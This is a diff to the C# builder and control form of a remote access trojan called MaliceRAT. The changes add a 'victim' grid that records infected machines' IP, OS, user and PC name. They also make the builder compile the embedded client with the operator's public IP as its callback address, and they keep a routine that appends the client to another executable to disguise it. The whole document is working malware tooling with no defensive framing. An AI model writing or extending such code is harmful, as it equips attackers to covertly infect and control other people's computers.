@@ -4,7 +4,10 @@ using System.IO;
 using System.Windows.Forms;
 using System.Reflection;
 using Microsoft.CSharp;
-using MaliceRAT.RatClient;
+using System.Threading.Tasks;
+using System.Drawing;
+using System.Drawing.Imaging;
+using MaliceRAT.RatServer;
 
 namespace MaliceRAT
 {
@@ -15,16 +18,19 @@ namespace MaliceRAT
         public Main()
         {
             InitializeComponent();
+
             server.StartServer();
+            server.InfoReceived += Server_InfoReceived;
+            server.ClientDisconnected += Server_ClientDisconnected;
         }
 
-       private string CompileClientExe()
+       private async Task<string> CompileClientExeAsync()
         {
             string sourceCode;
 
             try
             {
-                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MaliceRAT.client.main.cs"))
+                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MaliceRAT.RatClient.Client.cs"))
                 {
                     if (stream == null)
                     {
@@ -33,8 +39,11 @@ namespace MaliceRAT
                     using (StreamReader reader = new StreamReader(stream))
                     {
                         sourceCode = reader.ReadToEnd();
-                        Console.WriteLine(sourceCode);
                     }
+                }
+                if(gunaForwardedPorts.Checked) {
+                    string publicIP = await Utilities.GetPublicIPAddress();
+                    sourceCode = sourceCode.Replace("127.0.0.1", publicIP);
                 }
             }
             catch (Exception ex)
@@ -70,8 +79,9 @@ namespace MaliceRAT
                 {
                     errorMessage += $"\nLine {error.Line}, Column {error.Column}: {error.ErrorText}";
                 }
-                Console.WriteLine(errorMessage);
+                
                 MessageBox.Show(errorMessage);
+
                 return null;
             }
             return parameters.OutputAssembly;
@@ -82,14 +92,17 @@ namespace MaliceRAT
             byte[] exe1Bytes = File.ReadAllBytes(exe1);
             byte[] exe2Bytes = File.ReadAllBytes(exe2);
             byte[] combinedBytes = new byte[exe1Bytes.Length + exe2Bytes.Length];
+
             Buffer.BlockCopy(exe1Bytes, 0, combinedBytes, 0, exe1Bytes.Length);
             Buffer.BlockCopy(exe2Bytes, 0, combinedBytes, exe1Bytes.Length, exe2Bytes.Length);
+
             return combinedBytes;
         }
 
-        private void buildButton_Click(object sender, EventArgs e)
+        private async void buildButton_Click(object sender, EventArgs e)
         {
-            string exePath = CompileClientExe();
+            string exePath = await CompileClientExeAsync();
+
             if (exePath != null)
             {
                 if (gunaCheckBox2.Checked && !string.IsNullOrEmpty(textBox1.Text))
@@ -102,7 +115,7 @@ namespace MaliceRAT
                     File.Copy(exePath, Path.Combine(Application.StartupPath, "CombinedClient.exe"), true);
                 }
                 MessageBox.Show("Compilation successful: " + exePath);
-                if (gunaCheckBox3.Checked)
+                if (gunaOpenFolder.Checked)
                 {
                     System.Diagnostics.Process.Start("explorer.exe", Application.StartupPath);
                 }
@@ -122,6 +135,49 @@ namespace MaliceRAT
                     textBox1.Text = selectedFilePath;
                 }
             }
+        }
+        private async Task AddVictimToGrid(Victim victim) {
+            if (InvokeRequired) {
+                Invoke(new Action(async () => await AddVictimToGrid(victim)));
+                return;
+            }
+
+            int rowIndex = guna2DataGridView1.Rows.Add();
+            DataGridViewRow row = guna2DataGridView1.Rows[rowIndex];
+
+            row.Cells["ID"].Value = victim.Id;
+            row.Cells["IP"].Value = victim.IP;
+            row.Cells["OS"].Value = victim.OS;
+            row.Cells["USER"].Value = victim.User;
+            row.Cells["PC"].Value = victim.PC;
+
+            string ipToUse = victim.IP == "127.0.0.1" ? await Utilities.GetPublicIPAddress() : victim.IP;
+            Image flagImage = await Utilities.GetFlagFromIP(ipToUse);
+
+            row.Cells["Flag"].Value = flagImage;
+
+            for (int i = 0; i < guna2DataGridView1.Columns.Count; i++) {
+                if(row.Cells[i].Value == null) {
+                    row.Cells[i].Value = "N/A";
+                }
+            }
+        }
+        public void RemoveVictimFromGrid(Victim victim) {
+            if (guna2DataGridView1.InvokeRequired) {
+                guna2DataGridView1.Invoke(new Action(() => {
+                    guna2DataGridView1.Rows.Remove(guna2DataGridView1.Rows[victim.Id]);
+                }));
+            } else {
+                guna2DataGridView1.Rows.Remove(guna2DataGridView1.Rows[victim.Id]);
+            }
+        }
+        private async void Server_InfoReceived(Victim client) 
+        {
+            await AddVictimToGrid(client);
+        }
+        private void Server_ClientDisconnected(Victim client) 
+        {
+            RemoveVictimFromGrid(client);
         }
     }
 }
